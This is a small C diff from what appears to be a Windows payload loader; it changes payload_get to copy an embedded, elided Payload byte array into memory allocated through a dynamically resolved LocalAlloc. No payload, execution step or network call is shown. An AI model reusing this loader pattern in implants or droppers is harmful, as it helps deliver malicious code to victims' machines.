@@ -18,8 +18,11 @@ UCHAR Payload[] = { ... };
 
 
 LPVOID payload_get(PDWORD PayloadSize) {
-	DWORD Size = sizeof(Payload);
+    DWORD Size = sizeof(Payload);
+    LPVOID addr = g_ldr->apis->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, Size);
+    if (!addr) return NULL;
+    memcpy(addr, Payload, Size);
     *PayloadSize = Size;
-    return Payload;
+    return addr;
 
 }
